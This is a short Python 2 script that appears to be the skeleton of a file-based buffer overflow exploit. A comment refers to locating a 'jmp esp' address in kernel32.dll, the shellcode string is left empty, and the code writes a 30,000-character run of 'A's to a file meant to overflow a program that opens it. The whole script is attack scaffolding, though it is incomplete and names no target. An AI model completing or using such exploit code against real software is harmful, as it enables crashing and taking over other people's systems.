import struct
#kernel32.dll jmp esp using fndjump.exe

shellcode = ("")

buffer = "A"*30000

try:
        fl = open("filename","w")
        fl.write(buffer)
        fl.close()
except:
        print "failed"
